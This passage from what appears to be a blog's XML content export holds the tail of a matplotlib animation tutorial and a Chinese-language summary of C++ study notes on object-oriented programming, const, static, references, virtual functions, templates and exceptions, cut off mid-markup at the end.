class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ani = animation.FuncAnimation(fig=fig,</span><br><span class="line">                              func=animate,</span><br><span class="line">                              frames=<span class="number">100</span>,</span><br><span class="line">                              init_func=init,</span><br><span class="line">                              interval=<span class="number">20</span>,</span><br><span class="line">                              blit=<span class="keyword">False</span>)</span><br></pre></td></tr></table></figure><p>也可以将动画以mp4格式保存下来，但首先要保证你已经安装了<code>ffmpeg</code> 或者<code>mencoder</code>， 更多信息参考<a href="http://matplotlib.sourceforge.net/api/animation_api.html" target="_blank" rel="noopener">matplotlib animation api</a>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ani.save(<span class="string">'basic_animation.mp4'</span>, fps=<span class="number">30</span>, extra_args=[<span class="string">'-vcodec'</span>, <span class="string">'libx264'</span>])</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> Document </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>c++总结</title>
      <link href="/2021/04-13-c-summarize.html"/>
      <url>/2021/04-13-c-summarize.html</url>
      <content type="html"><![CDATA[<h1 id="面向对象程序设计"><a href="#面向对象程序设计" class="headerlink" title="面向对象程序设计"></a>面向对象程序设计</h1><h2 id="面向对象和面向过程的设计的对比"><a href="#面向对象和面向过程的设计的对比" class="headerlink" title="面向对象和面向过程的设计的对比"></a>面向对象和面向过程的设计的对比</h2><table><thead><tr><th>项目名称</th><th>面向对象</th><th>面向过程（结构化设计）</th></tr></thead><tbody><tr><td>定义</td><td>把整个需求按照特点、功能划分，将这些存在共性的部分封装成类（类实例化后才是对象），创建了对象不是为了完成某一个步骤，而是描述某个事物在解决问题的步骤中的行为</td><td>分析出解决问题所需要的步骤，然后用函数一步步的实现，实用的时候，一个个的一次调用即可</td></tr><tr><td>特点</td><td>封装、继承、多态</td><td>算法+数据结构</td></tr><tr><td>优势</td><td>适用于大型复杂系统，方便复用</td><td>适用于简单系统，容易理解</td></tr><tr><td>劣势</td><td>比较抽象</td><td>难以应对复杂系统，难以复用</td></tr><tr><td>设计语言</td><td>java,c++,c#,python等</td><td>c</td></tr></tbody></table><p>例如：五子棋的设计。面向过程是首先分析问题的步骤：1.开始游戏 2.黑子先走 3.绘制图画等等，最后输出结果，将对应的步骤分函数实现即可。</p><p>面向对象是：整个五子棋可以分为：1.黑白双方，行为是一样的 2.棋盘系统，负责绘制画面 3.规则系统，负责判断犯规，输赢等。玩家对象负责接收用户输入，并告知棋盘对象棋子的布局的变化，棋盘对象接收到了棋子的变化负责在屏幕上显示这种变化，同时用规则系统判定。 </p><h2 id="面向对象的程序设计的基本特征"><a href="#面向对象的程序设计的基本特征" class="headerlink" title="面向对象的程序设计的基本特征"></a>面向对象的程序设计的基本特征</h2><h3 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h3><p>将有关的数据和操作代码封装在一个对象中，形成一个基本单位，各个对象之间相互独立，互不干扰。用户对不同的数据有不同的权限，既降低了操作对象的复杂程度，又使安全性大大增加。</p><p>意义：</p><ul><li>将属性和行为作为整体，表现生活中的事物</li><li>将属性和行为加以权限控制</li></ul><p>语法：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> 类名</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    访问权限：属性/行为</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>描述类之间的关系。子类具有父类（基类）的部分特性，又可以增加自己的新特征，还可以继承父类的protected和public类型的数据。</p><p>如果子类中出现与父类同名的成员函数，子类的同名成员会隐藏掉父类的，可以加作用域符号访问父类的成员。</p><p>好处：</p><ul><li>可以减少重复代码</li><li>从基类继承表现共性，自定义的新增成员表现个性</li></ul><h4 id="继承的权限"><a href="#继承的权限" class="headerlink" title="继承的权限"></a>继承的权限</h4><p>public继承</p><ul><li>父类中的公共权限到子类还是公共的</li><li>父类中的保护权限到子类中还是保护的</li><li>父类的私有成员子类访问不到</li></ul><p>protected继承</p><ul><li>父类的公共子类变保护</li><li>父类的保护到子类变保护</li><li>父类的私有成员子类访问不到</li></ul><p>private继承</p><ul><li>父类的公共成员变私有</li><li>父类的保护成员变私有</li><li>父类的私有成员子类访问不到</li></ul><p><strong>父类中所有的非静态成员都会被子类继承下去，私有成员也继承了但是被编译器隐藏了，访问不到</strong></p><h4 id="多继承"><a href="#多继承" class="headerlink" title="多继承"></a>多继承</h4><p>多继承中如果父类出现了同名情况，子类使用的时候要加作用域。</p><p>经典的有菱形继承：两个派生类继承同一个基类，又有一个类用时继承这两个派生类。</p><p>两个父类有相同的成员名时，需要加作用域区分，但菱形继承导致数据有两份，资源浪费，可以利用虚继承解决。继承之前加virtual变为虚继承，此类称为虚基类。</p><h4 id="继承的构造与析构顺序"><a href="#继承的构造与析构顺序" class="headerlink" title="继承的构造与析构顺序"></a>继承的构造与析构顺序</h4><p>先构造父类，再构造子类，析构的顺序与构造相反。</p><h3 id="多态性"><a href="#多态性" class="headerlink" title="多态性"></a>多态性</h3><p>多态性是指用一个名字定义不同的函数，这些函数执行不同但又类似的操作，这样就可以用同一个函数名调用不同内容的函数。</p><h4 id="静态多态和动态多态的区别"><a href="#静态多态和动态多态的区别" class="headerlink" title="静态多态和动态多态的区别"></a>静态多态和动态多态的区别</h4><ul><li>静态多态编译阶段确定函数地址</li><li>动态多态运行时确定函数地址</li></ul><h4 id="静态多态（函数重载、运算符重载）"><a href="#静态多态（函数重载、运算符重载）" class="headerlink" title="静态多态（函数重载、运算符重载）"></a>静态多态（函数重载、运算符重载）</h4><h5 id="运算符重载"><a href="#运算符重载" class="headerlink" title="运算符重载"></a>运算符重载</h5><p>基本规则</p><ul><li>重载后运算符的优先级和结合性不会改变</li><li>不能改变原运算符操作数的个数</li><li>不能重载c++中没有的运算符</li><li>不能改变运算符的原有语义</li><li>运算符重载函数的参数至少应有一个是类对象（或类对象的引用）</li><li>重载函数可以是普通函数，类的成员函数或类的友元函数</li></ul><p>重载的两种方式</p><ul><li>重载为类的友元函数<ul><li>双目运算符、具有交换性的运算符、输入输出、左边的操作数不是类的类型。</li></ul></li><li>重载为类的成员函数<ul><li>单目运算符、需要修改类的数据，重载运算符的关键字是operator。输入输出运算符的重载必须为友元函数，且必须有输入输出流的返回值。</li></ul></li></ul><p>输入输出</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">friend</span> istream&amp; <span class="keyword">operator</span>&gt;&gt;(istream &amp;in, 重载类名 &amp;s)</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> in;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">friend</span> ostream&amp; <span class="keyword">operator</span>&lt;&lt;(ostream&amp;,重载类名&amp;);</span><br></pre></td></tr></table></figure><h4 id="动态多态（派生类和虚函数实现运行时多态）"><a href="#动态多态（派生类和虚函数实现运行时多态）" class="headerlink" title="动态多态（派生类和虚函数实现运行时多态）"></a>动态多态（派生类和虚函数实现运行时多态）</h4><p>满足的条件：</p><ul><li>有继承关系</li><li>子类重写父类的虚函数</li></ul><p>使用：</p><ul><li>父类的指针或者引用，执行子类对象</li></ul><h1 id="c-概述"><a href="#c-概述" class="headerlink" title="c++概述"></a>c++概述</h1><h2 id="结构体、联合体和枚举名可以直接作为类型名"><a href="#结构体、联合体和枚举名可以直接作为类型名" class="headerlink" title="结构体、联合体和枚举名可以直接作为类型名"></a>结构体、联合体和枚举名可以直接作为类型名</h2><p>在定义变量时，前面不用加对应的关键字（struct、union、enum）</p><h2 id="const"><a href="#const" class="headerlink" title="const"></a>const</h2><p>三种情况：</p><ul><li><p>常量指针</p><p>const int *p=&a;<br>指针的指向可以修改，但是指针执行的值不可以改。</p></li><li><p>指针常量<br>int *const p=&a;<br>指针的指向不能改，指向的值可以改</p></li><li><p>修饰常量<br>常量的值不能改</p></li></ul><h2 id="全局变量和局部变量"><a href="#全局变量和局部变量" class="headerlink" title="全局变量和局部变量"></a>全局变量和局部变量</h2><p>局部变量在作用域内权限高于全局变量。可以用作用域运算符“::”访问全局变量。如“::a”，表示全局变量a。</p><p>全局变量可以一直存在，存放在全局区，局部变量使用后不保存。</p><h2 id="static作用"><a href="#static作用" class="headerlink" title="static作用"></a>static作用</h2><ol><li>全局静态变量</li></ol><p>在全局变量前加上关键字static，全局变量就定义成一个全局静态变量。</p><p>静态存储区，在整个程序运行期间一直存在。</p><p>初始化：未经初始化的全局静态变量会被自动初始化为0（自动对象的值是任意的，除非他被显式初始化）。</p><p>作用域：全局静态变量在声明他的文件之外是不可见的，准确地说是从定义之处开始，到文件结尾。</p><ol start="2"><li>局部静态变量</li></ol><p>在局部变量之前加上关键字static，局部变量就成为一个局部静态变量。</p><p>内存中的位置：静态存储区。</p><p>初始化：未经初始化的全局静态变量会被自动初始化为0（自动对象的值是任意的，除非他被显式初始化）。</p><p>作用域：作用域仍为局部作用域，当定义它的函数或者语句块结束的时候，作用域结束。但是当局部静态变量离开作用域后，并没有销毁，而是仍然驻留在内存当中，只不过我们不能再对它进行访问，直到该函数再次被调用，并且值不变。</p><ol start="3"><li>静态函数</li></ol><p>在函数返回类型前加static，函数就定义为静态函数。函数的定义和声明在默认情况下都是extern的，但静态函数只是在声明他的文件当中可见，不能被其他文件所用。</p><p>函数的实现使用static修饰，那么这个函数只可在本cpp内使用，不会同其他cpp中的同名函数引起冲突。</p><p>warning：不要再头文件中声明static的全局函数，不要在cpp内声明非static的全局函数，如果你要在多个cpp中复用该函数，就把它的声明提到头文件里去，否则cpp内部声明需加上static修饰。</p><ol start="4"><li>类的静态成员</li></ol><p>在类中，静态成员可以实现多个对象之间的数据共享，并且使用静态数据成员还不会破坏隐藏的原则，即保证了安全性。因此，静态成员是类的所有对象中共享的成员，而不是某个对象的成员。对多个对象来说，静态数据成员只存储一处，供所有对象共用。</p><ol start="5"><li>类的静态函数</li></ol><p>静态成员函数和静态数据成员一样，它们都属于类的静态成员，它们都不是对象成员。因此，对静态成员的引用不需要用对象名。</p><p>在静态成员函数的实现中不能直接引用类中说明的非静态成员，可以引用类中说明的静态成员（这点非常重要）。如果静态成员函数中要引用非静态成员时，可通过对象来引用。从中可看出，调用静态成员函数使用如下格式：&lt;类名&gt;::&lt;静态成员函数名&gt;(&lt;参数表&gt;);</p><h2 id="内联函数（空间换时间）"><a href="#内联函数（空间换时间）" class="headerlink" title="内联函数（空间换时间）"></a>内联函数（空间换时间）</h2><p>函数前加inline。消除函数调用时的系统开销，提高运行速度。</p><p>对此函数调用是直接将代码插入到调用出，同时实参取代形参。</p><h3 id="与宏定义的区别"><a href="#与宏定义的区别" class="headerlink" title="与宏定义的区别"></a>与宏定义的区别</h3><p>宏定义是预编译程序对齐预处理的，它只做简单的字符置换，但是不做语法检查。使用内联函数可以保存宏定义的优点，同时不会出现副作用。</p><h2 id="函数重载"><a href="#函数重载" class="headerlink" title="函数重载"></a>函数重载</h2><p>函数名可以相同，提高复用性。</p><p>使用条件：</p><ul><li>同一个作用域下</li><li>函数名称相同</li><li>函数的参数类型不同或者个数不同或者顺序不同</li></ul><p>注意事项：</p><ul><li>函数返回值不在参数匹配检查中，因此只有返回值类型不同，则不允许重载。</li><li>函数重载与带默认值的函数一起实用时，有可能引起二义性</li><li>函数调用时，如果给出的实参和形参类型不相符，编译器会自动做类型转换，可能导致不可识别的错误。如定义了int和long，但是传入的是float类型</li></ul><h2 id="union联合体（无名联合）"><a href="#union联合体（无名联合）" class="headerlink" title="union联合体（无名联合）"></a>union联合体（无名联合）</h2><p>用的少，一般与结构体比较，具体可百度。</p><ul><li><p>结构体的各个成员会占用不同的内存，互相之间没有影响；而共用体的所有成员占用同一段内存，修改一个成员会影响其余所有成员。</p></li><li><p>结构体占用的内存大于等于所有成员占用的内存的总和（成员之间可能会存在缝隙），共用体占用的内存等于最长的成员占用的内存。</p></li><li><p>共用体使用了内存覆盖技术，同一时刻只能保存一个成员的值，如果对新的成员赋值，就会把原来成员的值覆盖掉。</p></li></ul><h2 id="new和delete"><a href="#new和delete" class="headerlink" title="new和delete"></a>new和delete</h2><ul><li>new可以自动计算所要分配的内存的大小</li><li>new能够自动返回正确的指针类型，不用像malloc一样强制转换</li><li>new int [10]，分配数组大小</li><li>new int(初值)  分配内存的同时初始化</li><li>new分配失败时一般返回NULL</li><li>delete删除数组delete []指针变量名;</li><li>new分配的空间不会自动释放，需要用delete</li></ul><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>引用的本质就是一个指针常量</p><p>注意事项</p><ul><li>引用必须初始化，初始化后不能更改</li><li>引用可以作为函数的返回值存在的</li><li>不要返回局部变量的引用</li><li>可以在函数调用时作为左值</li><li>引用类型和被引用的类型要一致</li></ul><h1 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><ul><li><p>对象：是描述其属性的数据及对这些数据的操作封装的统一体。把数据和操作看成一个整体。</p></li><li><p>方法：将函数定义为类的一部分或者将函数与某个对象绑定，该函数就称之为方法。</p></li><li><p>类：是实现信息封装的基础，类包含数据说明和一组操作数据的方法。类的实例是对象。 （从同类对象中抽出共性形成类。）</p></li></ul><p>类是对象的抽象，对象是类的具体实例。类是抽象的，不占用内存，而对象是具体的，占用存储空间。</p><p>类相当于自己定义的一个新的类型，可以用来定义对象，其地位和int等的地位相同。类定义的对象的大小取决于对象数据成员所占大小</p><p>实例化就是通过类创建对象的过程</p><h2 id="类的成员函数定义和声明"><a href="#类的成员函数定义和声明" class="headerlink" title="类的成员函数定义和声明"></a>类的成员函数定义和声明</h2><p><strong>类是抽象的数据类型，不占用存储空间，因此声明中不能给数据成员赋值。</strong></p><p>函数写在声明内时，默认定义为内联成员函数。一般类内只声明，类外实现。</p><p>类外实现用：类名::函数，只有::无类名或者都无，则是普通函数。</p><h2 id="访问权限"><a href="#访问权限" class="headerlink" title="访问权限"></a>访问权限</h2><ul><li>public：类内、外都可以访问</li><li>protected: 内可以，外不可以，子类可以访问父类的保护内容</li><li>private: 内可以，外不可以，子类不能访问父类的私有内容</li></ul><h2 id="struct和class的区别"><a href="#struct和class的区别" class="headerlink" title="struct和class的区别"></a>struct和class的区别</h2><ul><li>struct默认权限为公</li><li>class默认为私</li></ul><h2 id="构造和析构函数"><a href="#构造和析构函数" class="headerlink" title="构造和析构函数"></a>构造和析构函数</h2><ul><li><p>构造函数和类名相同，不能指定返回值类型可以重载</p></li><li><p>作用是在定义对象时对数据进行初始化，建立对象时自动调用，不能被用户调用。一个类只能由一个默认构造函数，类中定义了全部是默认参数的构造函数后就不能再定义重载构造函数。</p></li><li><p>析构函数是在类名前加一个~，作用是在撤销对象占用的内存之前完成一些清理工作，而非删除对象。与构造函数类似的是析构函数不返回任何值，没有函数类型，不同的是析构函数不能被重载，没有函数参数。一个类可以有多个构造函数，却只能由一个析构函数，在撤消对象占用内存前调用。</p></li></ul><p>析构的顺序是：先被定义的后析构。</p><p>其他类作为本类成员，构造时，先构造其他类的对象，再构造自身的。</p><h2 id="拷贝构造函数"><a href="#拷贝构造函数" class="headerlink" title="拷贝构造函数"></a>拷贝构造函数</h2><p>调用有三种情况：</p><ul><li>使用一个已经创建完毕的对象来初始化一个新对象</li><li>值传递的方式给函数参数传值</li><li>以值方式返回局部对象</li></ul><p>匿名对象：Person(10);执行后系统自动清理，不要利用拷贝构造函数初始化匿名对象。</p><h2 id="深浅拷贝"><a href="#深浅拷贝" class="headerlink" title="深浅拷贝"></a>深浅拷贝</h2><ul><li>浅拷贝：简单的赋值。堆区内容容易重复释放</li><li>深拷贝：在堆区重新申请空间，进行拷贝操作</li></ul><p>用深拷贝解决指针悬挂问题。</p><h2 id="静态成员"><a href="#静态成员" class="headerlink" title="静态成员"></a>静态成员</h2><p>成员变量或者函数前加static。不属于某一对象，实例化对象时不为静态成员分配空间，静态数据成员是在定义时被分配空间，到程序结束时才释放空间。可以被初始化，但必须要在类外，其关键字为static。静态成员函数没有this指针，不能访问非静态数据成员，用于访问静态数据成员。</p><p>静态成员变量：</p><ul><li>所有对象共享同一份数据</li><li>在编译阶段分配内存</li><li>类内声明，类外初始化</li></ul><p>静态成员函数：</p><ul><li>所有对象共享同一个函数</li><li>静态成员函数只能访问静态成员变量</li></ul><h2 id="成员变量和成员函数分开存储"><a href="#成员变量和成员函数分开存储" class="headerlink" title="成员变量和成员函数分开存储"></a>成员变量和成员函数分开存储</h2><p>只有非静态成员变量才属于类的对象上吗，非静态成员函数不属于类的对象上。</p><h2 id="空对象的内存空间大小为1"><a href="#空对象的内存空间大小为1" class="headerlink" title="空对象的内存空间大小为1"></a>空对象的内存空间大小为1</h2><p>每个空对象也分配一个字节空间，是为了区分空对象占内存的位置，每个空对象也应该有一个独一无二的内存地址。</p><h2 id="this指针"><a href="#this指针" class="headerlink" title="this指针"></a>this指针</h2><p>this作用域是在类内部，当在类的非静态成员函数中访问类的非静态成员的时候，编译器会自动将对象本身的地址作为一个隐含参数传递给函数。</p><p>是隐含每一个非静态成员函数内的一种指针，不需要定义，直接使用。本质是指针常量。</p><p>用途：</p><ul><li>当形参和成员变量同名时，可以用this指针来区分</li><li>在类的非静态成员函数中返回对象本身，可使用return *this</li></ul><p>当前类的对象。调用自己的构造函数</p><h2 id="常类型"><a href="#常类型" class="headerlink" title="常类型"></a>常类型</h2><p>常数据成员：只能通过构造函数的初始化表对常数据成员进行初始化</p><p>常成员函数：只能引用本类的数据成员，但不能修改</p><p>常对象：定义时必须同时进行初始化，且之后不能再改变，只能调用常成员函数，只能被常指针指向。</p><h3 id="常函数"><a href="#常函数" class="headerlink" title="常函数"></a>常函数</h3><ul><li>成员函数后加const称为常函数</li><li>常函数内不可以修改成员属性</li><li>成员属性声明时加关键字mutable，在常函数中依然可以修改</li></ul><h3 id="常对象"><a href="#常对象" class="headerlink" title="常对象"></a>常对象</h3><ul><li>声明对象前加const称为常对象</li><li>常对象只能调用常函数</li><li>常对象的数据成员值在对象的整个生存期内不能被改变</li></ul><h2 id="友元函数（可访问对应的私有成员）"><a href="#友元函数（可访问对应的私有成员）" class="headerlink" title="友元函数（可访问对应的私有成员）"></a>友元函数（可访问对应的私有成员）</h2><p>三种实现：</p><ul><li>全局函数做友元</li><li>类做友元</li><li>成员函数做友元</li></ul><p>在一个类的声明中加如另一个类，声明为friend，则那个类可以访问本类的私有成员，同理另一个类的成员函数可单独声明作为友元函数。</p><h2 id="虚基类"><a href="#虚基类" class="headerlink" title="虚基类"></a>虚基类</h2><p>如果一个类有多个直接基类，这些直接基类又有共同的基类，则派生类中会保留这个间接的共同基类数据成员的多份同名成员，造成内存浪费，经典的有菱形继承。在访问这些同名的成员时，必须在派生类对象名后增加直接基类名，使其唯一的标识一个成员，以免产生二义性。</p><p>使公共基类只产生一个复制，则可以将基类说明为虚基类。</p><p>虚基类在派生类中声明：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> 派生类名:</span><span class="keyword">virtual</span> 继承方式 基类名</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="虚基类的初始化"><a href="#虚基类的初始化" class="headerlink" title="虚基类的初始化"></a>虚基类的初始化</h3><ul><li>虚基类定义带形参的构造函数，并且没有定义默认形式的构造函数，则整个继承结构中，所有直接或间接的派生类都必须在构造函数的成员初始化表中列出对虚基类构造函数的调动，以初始化在虚基类中的数据成员</li><li>建立一个对象时，对象含有从虚基类继承来的成员，则虚基类的成员是由最远派生类的构造函数通过调用虚基类的构造函数进行初始化的。该派生类的其他基类对虚基类构造函数的调用都自动被忽略。</li><li>若同一层次中同时包含虚基类和非虚基类，应先调用虚基类的构造函数，再调用非虚基类的构造函数，最后调用派生类构造函数。</li><li>对于多个虚基类，构造函数的执行顺序仍然是先左后右，自上而下</li><li>对于非虚基类，构造函数的执行顺序仍然是先左后右，自上而下</li><li>若虚基类是非虚基类派生而来，则仍然先调用基类构造函数，再调用派生类的构造函数。</li></ul><h2 id="运算符重载（编译时）"><a href="#运算符重载（编译时）" class="headerlink" title="运算符重载（编译时）"></a>运算符重载（编译时）</h2><p><strong>重载的部分注意事项在第一章介绍多态的部分</strong></p><h3 id="加法重载"><a href="#加法重载" class="headerlink" title="加法重载"></a>加法重载</h3><p>示例:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Complex <span class="keyword">operator</span>+(Complex a1,Complex a2)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line">total=a1+a2;<span class="comment">//显示调用/隐式调用,等价于total=operator+(a1,a2)</span></span><br></pre></td></tr></table></figure><h3 id="不能运算法重载的"><a href="#不能运算法重载的" class="headerlink" title="不能运算法重载的"></a>不能运算法重载的</h3><ul><li>. //成员访问运算符</li><li>.*成员指针访问运算符</li><li>:: 作用域运算符</li><li>suzeif长度运算符</li><li>?:条件运算符</li></ul><h3 id="不能定义为友元运算符重载函数的"><a href="#不能定义为友元运算符重载函数的" class="headerlink" title="不能定义为友元运算符重载函数的"></a>不能定义为友元运算符重载函数的</h3><p>=、[]、函数调用“()”</p><h3 id="双目运算符重载"><a href="#双目运算符重载" class="headerlink" title="双目运算符重载"></a>双目运算符重载</h3><p>成员运算符重载函数的形参表仅有一个参数，作为运算符的右操作数。通过this指针隐含传递的。</p><ul><li>aa@bb  //隐式调用</li><li>aa.operator@(bb)//显式调用</li></ul><h3 id="成员运算符重载函数和友元运算符重载函数的比较"><a href="#成员运算符重载函数和友元运算符重载函数的比较" class="headerlink" title="成员运算符重载函数和友元运算符重载函数的比较"></a>成员运算符重载函数和友元运算符重载函数的比较</h3><h2 id="虚函数"><a href="#虚函数" class="headerlink" title="虚函数"></a>虚函数</h2><p>虚函数是重载的一种表现形式。是动态的重载，运行时的多态，就是在运行时才决定如何动态，即动态联编。</p><p>基类的对象指针可以指向它的公有派生的对象，但是当其指向公有派生类对象时，它只能访问派生类中从基类继承来的成员，而不能访问公有派生类中定义的成员。</p><p>而引入虚函数，程序在运行时根据指针所指向的实际对象，调用该对象的成员函数，可以解决此类问题。</p><h2 id="虚析构函数"><a href="#虚析构函数" class="headerlink" title="虚析构函数"></a>虚析构函数</h2><p>c++不能声明虚构造函数，但是可以声明虚析构函数。当派生类对象撤销时，一般先调用派生类的析构函数，然后再调用基类的析构函数。</p><p>但是遇到指针会先撤销基类的，因此要将基类的析构函数声明为虚析构函数。</p><h2 id="纯虚函数"><a href="#纯虚函数" class="headerlink" title="纯虚函数"></a>纯虚函数</h2><p>纯虚函数是在基类中的虚函数，在该基类中没有定义，但派生类需要定义，或仍然说明为纯虚函数。</p><p>用法：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">virtual</span> 函数类型 函数名（参数表）=<span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>作用：</p><p>在基类中为派生类保留一个函数的名字，以便派生类根据需要对它重新定义。</p><p>类中含有纯虚函数，则成为抽象类。</p><p>抽象类的使用规定：</p><ul><li>抽象类只能用作其他类的基类，不能建立抽象类对象</li><li>抽象类不能用作参数类型、函数返回类型或显式转换的类型。但可以声明指向抽象类的指针变量，此指针可以指向它的派生类，进而实现多态性</li><li>如果抽象类的派生类没有重新说明纯虚函数，则依然是抽象类</li></ul><h1 id="模版与异常处理"><a href="#模版与异常处理" class="headerlink" title="模版与异常处理"></a>模版与异常处理</h1><h2 id="函数模版"><a href="#函数模版" class="headerlink" title="函数模版"></a>函数模版</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> 类型参数&gt;</span><br><span class="line">返回类型 函数名（模版形参表）</span><br><span class="line">&#123;</span><br><span class="line">    函数体</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//也可以用下面这种</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> 类型参数&gt;</span></span><br><span class="line"><span class="class">返回类型 函数名（模版形参表）</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    函数体</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//对应的参数使用时必须要实例化</span></span><br></pre></td></tr></table></figure><p>注意：</p><ul><li>允许多个类型参数，参数必须加关键字typename或class</li><li>template与函数模版定义之间不能有别的语句</li><li>模版函数类似于重载函数，只不过更严格一些。同一模版函数实例化后执行相同的操作。</li><li>函数模版也可以重载</li><li>函数模版与同名的非模版函数也可以重载，先找的是非模版函数，找不到再看模版函数。</li></ul><h2 id="类模版"><a href="#类模版" class="headerlink" title="类模版"></a>类模版</h2><p>定义与函数模版类似</p><p>使用注意：</p><ul><li>需要在成员函数定义前进行模版声明</li><li>在成员函数名前缀上“类名&lt;类型参数&gt;::”</li></ul><p>类模版外定义的成员函数的一般形式：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> 类型参数&gt;</span><br><span class="line">函数类型 类名&lt;类型参数&gt;::成员函数名(形参表)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><p>程序运行时出现的错误称为异常。处理异常机制：try(检查)、throw(抛出)、catch(捕获)</p><p>使用：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    被检查的语句</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(异常类型声明<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    进行异常处理的复合语句<span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(...)<span class="comment">//表示异常是任意类型</span></span><br><span class="line">&#123;</span><br><span class="line">    进行异常处理的复合语句<span class="number">2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="流类库与输入输出"><a href="#流类库与输入输出" class="headerlink" title="流类库与输入输出"></a>流类库与输入输出</h1><p>示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">ofstream <span class="title">OF</span><span class="params">(<span class="string">"test.txt"</span>)</span></span>;</span><br><span class="line">    OF&lt;&lt;<span class="string">"hello"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="遇过的简答"><a href="#遇过的简答" class="headerlink" title="遇过的简答"></a>遇过的简答</h1><h2 id="重写和重载的区别"><a href="#重写和重载的区别" class="headerlink" title="重写和重载的区别"></a>重写和重载的区别</h2><p>重载实现的是编译时的多态性，重写实现的是运行时的多态性。重载发生在一个类中，同名的方法如果有不同的参数列表则视为重载；重写发生在子类与父类之间，重写要求子类被重写方法与父类被重写方法有相同的参数列表，有兼容的返回类型。</p><p>定义方法：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">virtual</span> 函数类型 函数名（形参表）</span><br><span class="line">&#123;</span><br><span class="line">    函数体</span><br><span 